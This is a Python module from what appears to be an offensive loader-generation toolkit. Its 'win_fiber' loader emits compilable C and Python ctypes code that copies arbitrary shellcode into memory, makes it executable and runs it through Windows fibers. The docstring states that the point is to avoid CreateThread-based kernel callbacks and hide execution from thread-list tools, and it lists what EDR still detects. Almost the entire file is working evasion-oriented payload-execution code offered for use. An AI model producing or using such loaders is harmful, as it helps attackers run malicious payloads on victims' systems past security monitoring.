"""Loader: win_fiber — VirtualAlloc(RX) → memcpy → ConvertThreadToFiber → CreateFiber → SwitchToFiber.

Tier 2. Avoids CreateThread entirely.
Fibers are user-mode cooperative threads. SwitchToFiber transfers execution
to the fiber's start routine without creating a new OS thread, bypassing
CreateThread-based kernel callbacks (PsSetCreateThreadNotifyRoutine).

Execution flow:
  1. Allocate RX memory and copy shellcode (two-stage: alloc RW, flip to RX)
  2. ConvertThreadToFiber: turn the current thread into a fiber
  3. CreateFiber: create a fiber with shellcode as start routine
  4. SwitchToFiber: transfer control; shellcode runs in the current thread

Evasion property:
  - No CreateThread / CreateRemoteThread in call graph
  - No new OS thread created — fiber execution is invisible to thread-list tools

Still triggers on:
  - VirtualProtect(RX) on anonymous memory
  - ConvertThreadToFiber + CreateFiber combo (monitored by modern EDR)
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_fiber")

_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>

{sc_array}

int main(void) {{
    LPVOID mem = VirtualAlloc(NULL, sc_len,
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_READWRITE);
    if (!mem) {{
        fprintf(stderr, "[-] VirtualAlloc failed: %lu\\n", GetLastError());
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    DWORD old_protect;
    if (!VirtualProtect(mem, sc_len, PAGE_EXECUTE_READ, &old_protect)) {{
        fprintf(stderr, "[-] VirtualProtect failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    LPVOID main_fiber = ConvertThreadToFiber(NULL);
    if (!main_fiber) {{
        fprintf(stderr, "[-] ConvertThreadToFiber failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    LPVOID sc_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)mem, NULL);
    if (!sc_fiber) {{
        fprintf(stderr, "[-] CreateFiber failed: %lu\\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }}

    SwitchToFiber(sc_fiber);

    DeleteFiber(sc_fiber);
    VirtualFree(mem, 0, MEM_RELEASE);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import sys

{sc_bytes}

kernel32 = ctypes.windll.kernel32

mem = kernel32.VirtualAlloc(None, len(sc),
                            0x3000,   # MEM_COMMIT | MEM_RESERVE
                            0x04)     # PAGE_READWRITE
if not mem:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(sc))

old = ctypes.c_ulong(0)
if not kernel32.VirtualProtect(ctypes.c_void_p(mem), len(sc),
                                0x20,  # PAGE_EXECUTE_READ
                                ctypes.byref(old)):
    sys.exit(1)

main_fiber = kernel32.ConvertThreadToFiber(None)
if not main_fiber:
    sys.exit(1)

sc_fiber = kernel32.CreateFiber(0, ctypes.c_void_p(mem), None)
if not sc_fiber:
    sys.exit(1)

kernel32.SwitchToFiber(ctypes.c_void_p(sc_fiber))
"""


def generate_c(shellcode: bytes) -> str:
    """Return a compilable C loader using ConvertThreadToFiber + CreateFiber + SwitchToFiber."""
    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))


def generate_python(shellcode: bytes) -> str:
    """Return a Python ctypes loader using fiber execution."""
    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
